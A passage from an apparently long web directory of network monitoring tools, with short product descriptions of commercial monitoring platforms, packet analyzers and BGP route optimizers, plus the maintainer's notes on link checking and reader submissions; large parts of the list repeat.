    provides centralized control for Wi-Fi networks. Features include: 
    access point configuration management, reporting, user tracking, 
    help desk views, and rogue AP discovery.
    
AKiPS Network Monitor
    software provides SNMP monitoring from a single VM
    at 1 minute resolution on networks ranging in size up to 1 million
    interfaces.
    


DDoS
    Platform provides solutions for WAN links monitoring, DDoS detection and mitigation, 
    traffic accounting and graphing.
    
Axence nVision
    monitors network infrastructure: Windows, TCP/IP services, web and mail servers, URLs, applications 
    (MS Exchange, SQL etc.). It also monitors routers and switches: network traffic, interface status, 
    connected computers. nVision collects network inventory and audit license usage - it can alert
    in case of a program installation or any configuration change on a remote node. 
    With the agent you can monitor user activity and access computers remotely.
    
Boundary
    A SaaS monitoring and visualization service that provides insight into: real time 
    (per second resolution) and historical end-to-end performance, traffic and flow 
    analysis, and device performance. It is free for the first 2GB of data (approx. 15 servers)
    
CapMon
    Network monitoring tool that takes away the hassle of maintaining a 
    Nagios installation. CapMon uses RRD wrapped in Flash to display 
    statistics, includes syslog, dashboard and SLA modules
    
Castle Rock 


CloudView NMS
    A Universal network Monitoring System based on multiple standards.
    


Cruz
    Cruz from Dorado Software is a Single Console for Datacenter and Network 
    Operations of Today's Converging Infrastructures. Cruz gives administrators 
    and operators critical resource control resulting in improved network and 
    service quality, accelerated network and service deployments, and lower 
    operating costs. The flexible and scalable tool consists of integrated 
    infrastructure management for multi-vendor and multi-technology (servers, 
    network devices, storage) environments. Cruz manages the diverse set of both 
    physical and virtual interdependent resources that deliver today's cloud 
    and next generation services. The result is comprehensive and automated problem 
    resolution from a single pane-of-glass. Some key features of the solution 
    include resource management, performance monitoring, topology, configuration 
    management, change management, auditing, firmware/OS deployment, 
    one-to-many device operations, and reporting.
    

Cymphonix Network Composer
    monitors Internet traffic by user, application, and threat. Includes controls 
    to shape access to Internet resources by user, group, and/or time of day. 
    Also featuring anonymous proxy blocking, policy management, and real time 
    monitoring.
    
David system
    allows you to manage your resources and services through both Intranet and Internet. 
    provide auto-discovering and network topology building features to help keep an 
    intuitive view of your IT infrastructure. Resources, real-time monitoring and 
    accessibility of historical data enable reaction to failures. 
    Configured interfaces for monitored devices allow you to focus on the most 
    important aspects of their work.
    
Domotz Pro
    is a SaaS platform for  remote monitoring and management. 
    It includes advanced network discovery, tcp and snmp monitoring, 
    network speed tests, as well as remote management features such 
    as remote connectivity to all devices in the network and 
    remote power management.
    
dopplerVUe
    provides network discovery, mapping and rules system enables monitoring of 
    Ping, SNMP, syslog, and WMI performance metrics. Can be used to monitor 
    IPv6 devices. Monitors services such as DNS, http and email.
    





EM7
    from Sciencelogic is an NMS integrated with trouble-ticketing, 
    event management, reporting, IP management, DNS and monitoring.
    
Enigma
    NMS enterprise grade network 
    management and monitoring solution is a suite of functions integrated 
    into single product. It has been installed in many Queensland Government 
    departments, where it manages and monitors many thousand network devices, 
    servers and apps.
    
Entuity
    provides an all-in-one network management solution for heterogeneous 
    environments and includes integrations with BMC, Oracle EM, HP, IBM and 
    others. Functionality includes discovery/inventory/topology, advanced 
    event management, port/device and flow-based performance, configuration 
    monitoring and extensive reporting.
    




Foglight1
    a Network Management System from Dell that enables discovery, mapping and 
    monitoring of network components worldwide. 
    
FrameFlow
    is free server monitoring software that includes system health monitoring, 
    web site monitoring, SNMP monitoring, reporting, alerts by e-mail and 
    customizable dashboards.
    
FreeNATS,
    is an open-source network monitoring, alerting and reporting system 
    available as PHP source and as a virtual appliance.
    




HPE Network Node Manager
    a unified fault, availability, and network performance monitoring of physical and virtual 
    devices for enterprise-scale networks.
  
IDERA
    Uptime Infrastructure Monitor offers users a comprehensive dashboard 
    that watches the performance and availability of all routers, switches, 
    servers, and other SNMP-enabled devices. Users can also quickly identify 
    bandwidth hogs with their Netflow monitoring features for an in-depth 
    network analysis and deep profiling of information on your network.
    
InfoVista Network Performance Management
    provides service level reporting and analysis tools for network and 
    application performance management.
    
InterMapper 
    Networking monitoring and alerting software for Mac, Windows, Linux, and Solaris.
    
IP Host Network Monitor
    is a network and server monitoring tool that lets you monitor availability and 
    performance of mail servers, internet hosts, database servers, and other network 
    resources. Performance counters on Windows computers can be monitored using WMI. 
    Other supported protocols are HTTP, HTTPS, FTP, SMTP, POP3, IMAP, ODBC, PING...
    




Just For Fun Network Monitoring
    System (JFFNMS) is FREE and designed to maintain a IP SNMP / Syslog / Tacacs+ Network. 
    It can be used to monitor any standards compilant SNMP device, Server, 
    TCP port or Custom Poller, also it has some Cisco oriented features. 
    

KACE
    from Quest, Management Appliance delivers a fully integrated systems 
    management solution.
    

Kaseya
    is a solution for monitoring, notification, and reporting. It includes 
    agentless monitoring of Windows, 
    Unix, Linux, and BSD operating system. It also includes distributed testing, a unique feature 
    that makes it possible to monitor servers, routers and other network connected 
    equipment that are behind a firewall or only accessible through a VPN.
    (Used to be called Intellipool).
    

kentik
    is an extensible big data SaaS platform for network monitoring 
    that encompasses flow traffic, BGP, network performance, geolocation 
    and other data types. It provides ad-hoc analysis, anomaly detection, 
    DDoS detection and automated mitigation triggering, and peering analytics.
    
Klogie
    commercial remote network monitoring system that designed for ease of use.
    
LANsurveyor
    network and desktop management software providing automatic network maps,
    asset management reports, network monitor and remote administration and
    distribution. 
    

Lemon
    is a server/client based monitoring system. On every monitored node, a monitoring agent 
    launches and communicates using a push/pull protocol with sensors which are responsible 
    for retrieving monitoring information. The extracted samples are stored on a local cache 
    and forwarded to a central Measurement Repository using UDP or TCP transport protocol 
    with or without authentication/encryption of data samples. Sensors can collect information 
    on behalf of remote entities like switches or power supplies. The Measurement Repository 
    can interface to a relational database or a flat-file backend for storing the received 
    samples. Web based interface is provided for visualizing the data.
    
LITHIUM
    LITHIUM|Core is an integrated device and service monitoring platform with a tightly 
    coupled incident tracking and case management system and incorporates a 
    web-based interface as well as Windows XP/Vista and Mac OS X monitoring consoles.
  

LogisoftAR provides
    is an NMP running under Windows providing 
    device discovery, mapping, fault (using SNMP traps and syslog) and 
    performance management. 
    Reporting is provided in HTML pages.
    



MetaNAV
    Network Administration Visualized is a software suite to 
    monitor large computer networks. It automatically discovers network 
    topology, monitors network load and outages, and can send alerts on 
    network events by e-mail and SMS, allowing for flexible configuration 
    of alert profiles.
    
MindArray
    offers unified network performance monitoring tool that provides insights into 
    critical business service with real-time analytics, root-cause analysis and                event management from any source
    


Monitoring Genie
    is a large scale data collection and monitoring platform built for telcos and 
    large service providedrs, able to monitor multiple parameters in 100Ks of nodes 
    in very shory cycles of about a minute using multiple protocols 
    (icmp,snmp,sql,http,telnet,ssh,wmi,registry,open ports...). It can 
    perform actions based on monitoring status changes using conditions and correlation rules.
    The platform comes with a builtin reporting system and pre made reports, 
    and can extended to monitor any parameter in the supported protocols. 
    The platform can work as a stand alone product or connect to existing management 
    platforms (hpov, tivoli and micromuse, unictenter, etc).
    
MotaData is a unified analytics 
    platform for complete IT Monitoring and Log Management that derives 
    business insights by real-time processing, correlation and  
    visualization of IT network and security information data.
    
MTD Netwiork Monioring Software
    brings information from SNMP and non-SNMP devices alike together into an 
    enterprise monitoring system with extensions for video based devices.
    
Monolith
    creates customized event management, netflow and  performance solutions 
    with a browser-based interface, a single, organic code-set and a 
    dashboarding engine.
    

NerveCenter
    is a Perl SNMP based true correlation application using finite state 
    technology to walk through network events looking for a cause and  
    effect relationships.  Most people use it for SNMP Polling and 
    trapping, but it's possible to use other protocols like SOAP and WMI 
    as the information interface. Since its Perl it does if/elsif and then logic.   
    
Netcool
    suite offers five product families that support domain-specific 
    IT management, end-to-end consolidated operations and business 
    service management.
  NetCrunch
    is An all-in-one and agentless network monitoring and management system, 
    capable of monitoring every device in your network. Monitor bandwidth, 
    availability, performance and NetFlow. Automatic views and maps. 
    All leading operating systems supported.
    
NetGong
    is a network monitoring solution allowing network administrators, webmasters, and 
    Internet service providers to monitor any networked device on the Internet, 
    corporate intranet, or TCP/IP LAN and receive alerts via audible alarm, message, 
    e-mail, or third-party software when a connection fails. 
    
NetInfo
    is a collection of 15 network tools on a single, 
    interface. NetInfo allows businesses to combat network downtime by allowing 
    network administrators, webmasters, and Internet service providers to
    isolate faults, process  diagnostic data and increase internal network security.
    
NetMapper
    creates automated up-to-date Microsoft Visio® network diagrams, combining multiple 
    physical (Layer 2/3) and logical views of the network with detailed device 
    configurations and topology overlays like BGP, OSPF, VLANs and VPNs
    
NetMRI1 
    from Infoblox
    automates much of Network Change and Configuration Management (NCCM)by collecting 
    and analyzing network configuration, snmp, and syslong/event data, and providing 
    daily actionable issues.
    
NetPrefect
    is an enterprise class management and monitoring solution designed primarily for 
    managed service providers that uses a variety of mechanisms to communicate with 
    managed entities including but not limited to snmp, wmi, rs232 and icmp in order 
    to collect statistical and state information (e.g. cpu usage, device/service 
    availability etc) as well as executing management functions on the device.
    
NetQoS Performance Center
    Monitors and provides insight into: end-to-end performance, traffic analysis, 
    VoIP quality, and device performance.  
  NetXMS
    is an open-source feature-rich network monitoring system that 
    runs natively on Windows and various Unix flavours. It can be used for 
    monitoring entire IT infrastructures, starting with SNMP-capable 
    hardware and ending with applications on servers. 
    
N-able
    provides availability, performance, security and service management to 
    multiple customers from one central Web console. 
    
NetCrunch
    from AdRem, provides visualization of physical network topology; 
    flexible performance monitoring, trending and reporting; event 
    filtering and escalation; SNMP management; web access. 
    

NetMechanica1 
    provides low-cost network masnagement services.
    
Netview
Nimsoft
    Monitoring Solutions (NMS) for Network Monitoring solution verifies 
    network connectivity to 
    devices (routers, switches, servers, etc.) and application services 
    (FTP, SMTP, HTTP, etc.) revealing accessibility and network latency. 
    The solution auto-discovers network interfaces, monitors interface 
    traffic and calculates bandwidth utilization.
    Uses SNMP and if not available then syslog can be used.
    

NeuralStar
    provides enterprise-class capabilities including NOC level visibility, 
    management of multiple and geographically distributed networks and automatic 
    failover and redundancy for continuous operations.
    

Observium
    Observium is an autodiscovering network monitoring platform supporting 
    hardware platforms and operating systems including Cisco, Windows, 
    Linux, HP, Juniper, Dell, FreeBSD, Brocade, Netscaler, NetApp and 
    many more. Observium seeks to provide a powerful yet simple and 
    intuitive interface to the health and status of your network.
    
op5 Monitor
    provides active monitoring of the IT infrastructure - 
    hardware, traffic & services. This includes connected components 
    from servers, routers and printers services such as mail services, 
    web servers and virus programmes. It is based on Nagios.
    
OpenNMS
    is an enterprise-grade network management platform developed under the open source model. 
    It is designed to scale to tens or hundreds of thousands of managed nodes from a single 
    instance. OpenNMS is an integrated platform providing service availability management, 
    performance data collection (via SNMP, JMX, HTTP, WMI, XMP, and other protocols), 
    event management (internal events, custom events via an XML/TCP interface, 
    and external events via SNMP traps and TL1), event de-duplication, and flexible 
    notifications (via SMTP, XMPP, and many other protocols). The software is free under 
    the GPLv2 license, and commercial support, training, and consulting are available. 
    

OpenView (then Operations Manager then OMi) 
OPNET nCompass
    visualizes network performance metrics in real-time, consolidating topology, 
    traffic and events in a unified view. It automates response to network events and 
    contextually launches 3rd party tools for assisted troubleshooting.
    
Opsview
    is enterprise network and application monitoring software designed for 
    scalability, flexibility and ease of use. Opsview has been in development 
    since 2003 (originally based on Nagios) and is released under the GNU GPL 
    license.
    
Opsview
    is enterprise network and application monitoring software designed for 
    scalability, flexibility and ease of use. Opsview has been in development 
    since 2003 (originally based on Nagios) and is released under the GNU GPL 
    license.
    
SolarWinds Network Performance Monitor (NPM)
    SolarWinds Network Performance Monitor enables you to detect, 
    diagnose, and resolve network outages and performance issues. It offers 
    network-centric views that are designed to deliver the critical 
    information you need.
    




Pandora the Free Monitoring System
    is a Free Software set of programs, set under the GPL license, that 
    monitors and detects network systems using remote tests (ICMP, TCP Sweep, Network scan, 
    SNMP monitoring...), or using local agents to grab application/system datga (has agents 
    for Linux, AIX, HP-UX, Solaris and Windows XP,2000/2003). Pandora FMS is able to fire 
    alarms, draw graphs and keep event history for each element using a SQL backend
    

PathSolutions TotalView
    Root-cause troubleshooting for voice, video, and data networks.
    
Q3ADE

Reconnoiter
    is a monitoring and trend analysis system designed to cope with large architectures 
    (thousands of machines and hundreds of thousands of metrics). 
    


ScriptLogic Perspective
    addresses the problems associated with bandwidth, network and application 
    performance, and connectivity that are often  issues for IT departments.	
    Perspective supports multiple sites, is easy to use. 
    
Sentinet3
    provides  networks, applications, systems, environment and security monitoring.
    
ServersCheck
    is a web based monitoring tool for monitoring networks and servers (e.g. temperatures etc.)
    
SevOne
    provides a distributed network performance management platform that 
    delivers a scalable and comprehensive real-time monitoring, 
    troubleshooting and reporting solution that supports over 15 
    collection methodologies such as SNMP, NetFlow, ICMP, IP SLA, WMI, 
    vCenter API, XML, and JMX.
    





    Spectrum1 (ex Cabletron, then Aprisma then Concord Communications 
    then CA). Network Tool specialized in Fault Management and Root Cause Analysis 
    engine. Helps optimize MTTR and MTBF.The tool is modular in that it can also 
    monitor/manage QOS,MPLS/VPN,Multicast Network, Device Configurations.
    


StableNet
    Carrier-Grade performance management tool, built upon open standards. 
    Supports active (Ping, SAA) and passive (SNMP, RMON, NetFlow, SFlow) 
    measurements. Integrated topology/inventory, SLA/SLM, reporting.
    
Sun Solstice
Switch Center
    Network management and monitoring software using SNMP (v1-3) network devices from 
    any vendor including network discovery, logical and physical (Layer 2/3) network 
    topology mapping, performance monitoring, real-time reports and pro-active alerts.
    


SysUpTime
    is a free distributed network/systems management product. It provides 
    users out-of-box capabilities to efficiently and proactively manage 
    networks of any size.
    
Tembria
    Tembria Server Monitor is an affordable server monitoring platform with 
    deep support for Windows server monitoring plus support for Linux and 
    SNMP devices too.
    
The Dude is a free
    network monitor will automatically scan all devices within specified 
    subnets, draw and layout a map of your networks, monitor services of 
    your devices and alert you in case some service has problems.
    
TruePath Technologies
    LMS is a web based monitoring and reporting tool that focuses on carrier, 
    Metro (MEF), OAM and 1731 type monitoring.  It has a built-in end-user 
    portal and multi-threaded polling engine for fast, reliable monitoring.
    
Uptrends Infra
    is a network monitoring solution/platform. With Uptrends Infra you can monitor 
    network protocols and network devices.
    
Vallum Halo
    Manager is a web-based network monitor tool, based on GMI agent technology, suitable 
    for small networks or distributed management of many subnets, featuring continuous 
    polling of ping and GMI devices, auto-discovery, alerting, and performance metrics.
    
Verax NMS
    is a service availability and performance monitoring system supporting 
    a range of network elements (e.g. Windows and Linux hosts, ATM switches, 
    Brocade and Juniper routers, ADVA Optical Networking FSP), applications 
    (e.g. Apache Tomcat and WebSphere servers, Oracle and Microsoft SQL Server 
    databases), virtualisation (e.g. VMware vSphere) and data center devices 
    (incl. power supplies, air conditioning, sensors and detectors).
    

WhatsUp Gold
    discovers and maps your network, uses SNMP v1-3, WMI and custom scripts 
    to monitor resources and applications on your devices, notifies you via 
    email, SMS, pager, etc., when problems occur, and provides historical and 
    real-time reporting through a Windows console interface, full Web 
    interface, and mobile interface. WhatsUp Gold is available for single 
    networks and as a distributed solution for managing large, geographically 
    dispersed networks
    
ZettaView
    is a 24/7 monitoring, trend analysis, reporting, and alarm management system for LAN, 
    WAN, and ATM that stores information at a 10 second granularity on local probes.
    
Zoho Corp ManageEngine OpManager


 
    network management software.
  Zyrion Traverse
    a network, application & server monitoring platform with open API, 
    correlated views of IT "services" and integration with flow analysis tools.
    



Monitoring Tools Integrated with NMP [Contents]



Ciscoworks 


Optimal Networks. 
ScriptLogic Perspective
    has several tools including 
    
    Network Traffic Analysis,
    
    VoIP monitoring and
    
    Wireless monitoring.
  Solarwinds has several tools including: Server Application Monitor,
    NetFlow Traffic Analyzer,
    VoIP Monitor,
    Wireless
Network Monitor.  





Commercial Monitoring Tools, not integrated with an NMP [Contents]
Analyzer/Sniffer |
Application/Services/Systems monitoring 
(Hosted/managed monitoring services) | 
BGP |
Emulators |
Flow Monitoring |
FTP |
IP Address/Asset Management |
IT Search | 
Network Security tools |
SNMP Tools |
Topology/Mapping/Traceroute |
VOIP |
Video-over-IP



AlertCenter
    provides monitoring, alerting and corrective action automation scheduling. 
    It is part of the 
    MKS Toolkit.
  AlertSite
    measures, diagnoses, notifies and reports on the availability and 
    performance of servers, URLs, web applications and virtually any 
    Internet connected device or application.
    

Analyzer/Sniffers, see also public domain capture tools.
  
ACE Analyst
      from OPnet is a transactional analysis solution, based on network packet captures.
      
All-in-one Netwflow Anslyzer PRTG
      monitors your bandwidth and traffic, supports all different NetFlow versions, monitors all important flow protocols.
    Anritsu
       provide the MD1230 portable network and IP network performance monitor.
      


Anue Systems,
           makes a Net Tool Optimizer that is used to connect multiple monitoring tools to 
           a network link, or one tool to multiple links.  This is a hardware device.  
           It is similar to Gigamon.
           
APCON,
      manufactures a physical layer matrix switch to remotely move and share 
      network monitoring tools using a software interface or scripting.
      
AthTek NetWalk Enterprise Edition
      is a comprehensive network monitoring tool which is expert in packet sniffing and analyzing.
      
BGP

Border 61,
        NSI probes the available BGP transits to each available destination and then 
        enforces an outbound path based upon packet loss, delay and 
        links costs / available bandwidth.
      

Noction
        IRP actively probes remote prefixes for metrics such as packet loss, 
        latency, throughput, historical reliability and maximum peer capacity. 
        Based on these actively gathered metrics, the platform computes a 
        performance and/or a cost-based route optimization. 
        The platform then announces the improved route to the network`s 
        edge routers via a typical BGP session.We welcome corrections such as identifying broken links 
(especially if you can provide an alternate/update), 
since over the years companies are absorbed by others, disappear, split up,
change their web site etc.
To find broken links, we use 
CheckLink suggested by
Brad Canham, and even better the

Chrome browser extension for checking links,
suggested by Brian Albert Jensen. 
Another valuable tool for checking links is 

Link Quality at a Glance1
from Hans van der Graaf.

Some links such as BasicState and Lemon 
give a 404 error code or a 405 code in the case of MLab but appear 
to be accessible and so currently are left in.
Others such as MindArray and NetLogger sometimes timeout, but usually work.


This is a volunteer, unfunded effort. This helps assure
its independence. 
Increasingly new additions are from reader suggestions/recommendations.
If you have a suggestion for adding something: 
please send an email to Cottrell at slac.stanford.edu 

making sure that you 
indicate where the tool fits in the hierarchy, provide a URL to get
more information on the tool,
and provide a short 
one sentence description of the tool's purpose with no 
marketing hyperbole.  Also if you notice out of date or incorrect links 
please report.  Thanks.



Network Monitoring Platforms (NMPs) - 

Comparison of NMPs, [Contents]



ActionPacked!3
    LiveAction is a platform that combines detailed network topology, device, 
    and flow visualizations with direct interactive monitoring and configuration 
    of QoS, NetFlow, LAN, Routing, IP SLA, Medianet, and AVC features embedded inside Cisco devices.
    

Aggregate Network Manager
    is an enterprise-grade network/application/performance monitoring platform. 
    It tightly integrates with other smart building management systems, such as 
    physical access control, HVAC, lighting, and time/attendance control.
    
Airwave
    Management PlatformT (AMP) wireless network management software 
    provides centralized control for Wi-Fi networks. Features include: 
    access point configuration management, reporting, user tracking, 
    help desk views, and rogue AP discovery.
    
AKiPS Network Monitor
    software provides SNMP monitoring from a single VM
    at 1 minute resolution on networks ranging in size up to 1 million
    interfaces.
    


DDoS
    Platform provides solutions for WAN links monitoring, DDoS detection and mitigation, 
    traffic accounting and graphing.
    
Axence nVision
    monitors network infrastructure: Windows, TCP/IP services, web and mail servers, URLs, applications 
    (MS Exchange, SQL etc.). It also monitors routers and switches: network traffic, interface status, 
    connected computers. nVision collects network inventory and audit license usage - it can alert
    in case of a program installation or any configuration change on a remote node. 
    With the agent you can monitor user activity and access computers remotely.
    
Boundary
    A SaaS monitoring and visualization service that provides insight into: real time 
    (per second resolution) and historical end-to-end performance, traffic and flow 
    analysis, and device performance. It is free for the first 2GB of data (approx. 15 servers)
    
CapMon
    Network monitoring tool that takes away the hassle of maintaining a 
    Nagios installation. CapMon uses RRD wrapped in Flash to display 
    statistics, includes syslog, dashboard and SLA modules
    
Castle Rock 


CloudView NMS
    A Universal network Monitoring System based on multiple standards.
    


Cruz
    Cruz from Dorado Software is a Single Console for Datacenter and Network 
    Operations of Today's Converging Infrastructures. Cruz gives administrators 
    and operators critical resource control resulting in improved network and 
    service quality, accelerated network and service deployments, and lower 
    operating costs. The flexible and scalable tool consists of integrated 
    infrastructure management for multi-vendor and multi-technology (servers, 
    network devices, storage) environments. Cruz manages the diverse set of both 
    physical and virtual interdependent resources that deliver today's cloud 
    and next generation services. The result is comprehensive and automated problem 
    resolution from a single pane-of-glass. Some key features of the solution 
    include resource management, performance monitoring, topology, configuration 
    management, change management, auditing, firmware/OS deployment, 
    one-to-many device operations, and reporting.
    

Cymphonix Network Composer
    monitors Internet traffic by user, application, and threat. Includes controls 
    to shape access to Internet resources by user, group, and/or time of day. 
    Also featuring anonymous proxy blocking, policy management, and real time 
    monitoring.
    
David system
    allows you to manage your resources and services through both Intranet and Internet. 
    provide auto-discovering and network topology building features to help keep an 
    intuitive view of your IT infrastructure. Resources, real-time monitoring and 
    accessibility of historical data enable reaction to failures. 
    Configured interfaces for monitored devices allow you to focus on the most 
    important aspects of their work.
    
Domotz Pro
    is a SaaS platform for  remote monitoring and management. 
    It includes advanced network discovery, tcp and snmp monitoring, 
    network speed tests, as well as remote management features such 
    as remote connectivity to all devices in the network and 
    remote power management.
    
dopplerVUe
    provides network discovery, mapping and rules system enables monitoring of 
    Ping, SNMP, syslog, and WMI performance metrics. Can be used to monitor 
    IPv6 devices. Monitors services such as DNS, http and email.
    





EM7
    from Sciencelogic is an NMS integrated with trouble-ticketing, 
    event management, reporting, IP management, DNS and monitoring.
    
Enigma
    NMS enterprise grade network 
    management and monitoring solution is a suite of functions integrated 
    into single product. It has been installed in many Queensland Government 
    departments, where it manages and monitors many thousand network devices, 
    servers and apps.
    
Entuity
    provides an all-in-one network management solution for heterogeneous 
    environments and includes integrations with BMC, Oracle EM, HP, IBM and 
    others. Functionality includes discovery/inventory/topology, advanced 
    event management, port/device and flow-based performance, configuration 
    monitoring and extensive reporting.
    




Foglight1
    a Network Management System from Dell that enables discovery, mapping and 
    monitoring of network components worldwide. 
    
FrameFlow
    is free server monitoring software that includes system health monitoring, 
    web site monitoring, SNMP monitoring, reporting, alerts by e-mail and 
    customizable dashboards.
    
FreeNATS,
    is an open-source network monitoring, alerting and reporting system 
    available as PHP source and as a virtual appliance.
    




HPE Network Node Manager
    a unified fault, availability, and network performance monitoring of physical and virtual 
    devices for enterprise-scale networks.
  
IDERA
    Uptime Infrastructure Monitor offers users a comprehensive dashboard 
    that watches the performance and availability of all routers, switches, 
    servers, and other SNMP-enabled devices. Users can also quickly identify 
    bandwidth hogs with their Netflow monitoring features for an in-depth 
    network analysis and deep profiling of information on your network.
    
InfoVista Network Performance Management
    provides service level reporting and analysis tools for network and 
    application performance management.
    
InterMapper 
    Networking monitoring and alerting software for Mac, Windows, Linux, and Solaris.
    
IP Host Network Monitor
    is a network and server monitoring tool that lets you monitor availability and 
    performance of mail servers, internet hosts, database servers, and other network 
    resources. Performance counters on Windows computers can be monitored using WMI. 
    Other supported protocols are HTTP, HTTPS, FTP, SMTP, POP3, IMAP, ODBC, PING...
    




Just For Fun Network Monitoring
    System (JFFNMS) is FREE and designed to maintain a IP SNMP / Syslog / Tacacs+ Network. 
    It can be used to monitor any standards compilant SNMP device, Server, 
    TCP port or Custom Poller, also it has some Cisco oriented features. 
    

KACE
    from Quest, Management Appliance delivers a fully integrated systems 
    management solution.
    

Kaseya
    is a solution for monitoring, notification, and reporting. It includes 
    agentless monitoring of Windows, 
    Unix, Linux, and BSD operating system. It also includes distributed testing, a unique feature 
    that makes it possible to monitor servers, routers and other network connected 
    equipment that are behind a firewall or only accessible through a VPN.
    (Used to be called Intellipool).
    

kentik
    is an extensible big data SaaS platform for network monitoring 
    that encompasses flow traffic, BGP, network performance, geolocation 
    and other data types. It provides ad-hoc analysis, anomaly detection, 
    DDoS detection and automated mitigation triggering, and peering analytics.
    
Klogie
    commercial remote network monitoring system that designed for ease of use.
    
LANsurveyor
    network and desktop management software providing automatic network maps,
    asset management reports, network monitor and remote administration and
    distribution. 
    

Lemon
    is a server/client based monitoring system. On every monitored node, a monitoring agent 
    launches and communicates using a push/pull protocol with sensors which are responsible 
    for retrieving monitoring information. The extracted samples are stored on a local cache 
    and forwarded to a central Measurement Repository using UDP or TCP transport protocol 
    with or without authentication/encryption of data samples. Sensors can collect information 
    on behalf of remote entities like switches or power supplies. The Measurement Repository 
    can interface to a relational database or a flat-file backend for storing the received 
    samples. Web based interface is provided for visualizing the data.
    
LITHIUM
    LITHIUM|Core is an integrated device and service monitoring platform with a tightly 
    coupled incident tracking and case management system and incorporates a 
    web-based interface as well as Windows XP/Vista and Mac OS X monitoring consoles.
  

LogisoftAR provides
    is an NMP running under Windows providing 
    device discovery, mapping, fault (using SNMP traps and syslog) and 
    performance management. 
    Reporting is provided in HTML pages.
    



MetaNAV
    Network Administration Visualized is a software suite to 
    monitor large computer networks. It automatically discovers network 
    topology, monitors network load and outages, and can send alerts on 
    network events by e-mail and SMS, allowing for flexible configuration 
    of alert profiles.
    
MindArray
    offers unified network performance monitoring tool that provides insights into 
    critical business service with real-time analytics, root-cause analysis and                event management from any source
    


Monitoring Genie
    is a large scale data collection and monitoring platform built for telcos and 
    large service providedrs, able to monitor multiple parameters in 100Ks of nodes 
    in very shory cycles of about a minute using multiple protocols 
    (icmp,snmp,sql,http,telnet,ssh,wmi,registry,open ports...). It can 
    perform actions based on monitoring status changes using conditions and correlation rules.
    The platform comes with a builtin reporting system and pre made reports, 
    and can extended to monitor any parameter in the supported protocols. 
    The platform can work as a stand alone product or connect to existing management 
    platforms (hpov, tivoli and micromuse, unictenter, etc).
    
MotaData is a unified analytics 
    platform for complete IT Monitoring and Log Management that derives 
    business insights by real-time processing, correlation and  
    visualization of IT network and security information data.
    
MTD Netwiork Monioring Software
    brings information from SNMP and non-SNMP devices alike together into an 
    enterprise monitoring system with extensions for video based devices.
    
Monolith
    creates customized event management, netflow and  performance solutions 
    with a browser-based interface, a single, organic code-set and a 
    dashboarding engine.
    

NerveCenter
    is a Perl SNMP based true correlation application using finite state 
    technology to walk through network events looking for a cause and  
    effect relationships.  Most people use it for SNMP Polling and 
    trapping, but it's possible to use other protocols like SOAP and WMI 
    as the information interface. Since its Perl it does if/elsif and then logic.   
    
Netcool
    suite offers five product families that support domain-specific 
    IT management, end-to-end consolidated operations and business 
    service management.
  NetCrunch
    is An all-in-one and agentless network monitoring and management system, 
    capable of monitoring every device in your network. Monitor bandwidth, 
    availability, performance and NetFlow. Automatic views and maps. 
    All leading operating systems supported.
    
NetGong
    is a network monitoring solution allowing network administrators, webmasters, and 
    Internet service providers to monitor any networked device on the Internet, 
    corporate intranet, or TCP/IP LAN and receive alerts via audible alarm, message, 
    e-mail, or third-party software when a connection fails. 
    
NetInfo
    is a collection of 15 network tools on a single, 
    interface. NetInfo allows businesses to combat network downtime by allowing 
    network administrators, webmasters, and Internet service providers to
    isolate faults, process  diagnostic data and increase internal network security.
    
NetMapper
    creates automated up-to-date Microsoft Visio® network diagrams, combining multiple 
    physical (Layer 2/3) and logical views of the network with detailed device 
    configurations and topology overlays like BGP, OSPF, VLANs and VPNs
    
NetMRI1 
    from Infoblox
    automates much of Network Change and Configuration Management (NCCM)by collecting 
    and analyzing network configuration, snmp, and syslong/event data, and providing 
    daily actionable issues.
    
NetPrefect
    is an enterprise class management and monitoring solution designed primarily for 
    managed service providers that uses a variety of mechanisms to communicate with 
    managed entities including but not limited to snmp, wmi, rs232 and icmp in order 
    to collect statistical and state information (e.g. cpu usage, device/service 
    availability etc) as well as executing management functions on the device.
    
NetQoS Performance Center
    Monitors and provides insight into: end-to-end performance, traffic analysis, 
    VoIP quality, and device performance.  
  NetXMS
    is an open-source feature-rich network monitoring system that 
    runs natively on Windows and various Unix flavours. It can be used for 
    monitoring entire IT infrastructures, starting with SNMP-capable 
    hardware and ending with applications on servers. 
    
N-able
    provides availability, performance, security and service management to 
    multiple customers from one central Web console. 
    
NetCrunch
    from AdRem, provides visualization of physical network topology; 
    flexible performance monitoring, trending and reporting; event 
    filtering and escalation; SNMP management; web access. 
    

NetMechanica1 
    provides low-cost network masnagement services.
    
Netview
Nimsoft
    Monitoring Solutions (NMS) for Network Monitoring solution verifies 
    network connectivity to 
    devices (routers, switches, servers, etc.) and application services 
    (FTP, SMTP, HTTP, etc.) revealing accessibility and network latency. 
    The solution auto-discovers network interfaces, monitors interface 
    traffic and calculates bandwidth utilization.
    Uses SNMP and if not available then syslog can be used.
    

NeuralStar
    provides enterprise-class capabilities including NOC level visibility, 
    management of multiple and geographically distributed networks and automatic 
    failover and redundancy for continuous operations.
    

Observium
    Observium is an autodiscovering network monitoring platform supporting 
    hardware platforms and operating systems including Cisco, Windows, 
    Linux, HP, Juniper, Dell, FreeBSD, Brocade, Netscaler, NetApp and 
    many more. Observium seeks to provide a powerful yet simple and 
    intuitive interface to the health and status of your network.
    
op5 Monitor
    provides active monitoring of the IT infrastructure - 
    hardware, traffic & services. This includes connected components 
    from servers, routers and printers services such as mail services, 
    web servers and virus programmes. It is based on Nagios.
    
OpenNMS
    is an enterprise-grade network management platform developed under the open source model. 
    It is designed to scale to tens or hundreds of thousands of managed nodes from a single 
    instance. OpenNMS is an integrated platform providing service availability management, 
    performance data collection (via SNMP, JMX, HTTP, WMI, XMP, and other protocols), 
    event management (internal events, custom events via an XML/TCP interface, 
    and external events via SNMP traps and TL1), event de-duplication, and flexible 
    notifications (via SMTP, XMPP, and many other protocols). The software is free under 
    the GPLv2 license, and commercial support, training, and consulting are available. 
    

OpenView (then Operations Manager then OMi) 
OPNET nCompass
    visualizes network performance metrics in real-time, consolidating topology, 
    traffic and events in a unified view. It automates response to network events and 
    contextually launches 3rd party tools for assisted troubleshooting.
    
Opsview
    is enterprise network and application monitoring software designed for 
    scalability, flexibility and ease of use. Opsview has been in development 
    since 2003 (originally based on Nagios) and is released under the GNU GPL 
    license.
    
Opsview
    is enterprise network and application monitoring software designed for 
    scalability, flexibility and ease of use. Opsview has been in development 
    since 2003 (originally based on Nagios) and is released under the GNU GPL 
    license.
    
SolarWinds Network Performance Monitor (NPM)
    SolarWinds Network Performance Monitor enables you to detect, 
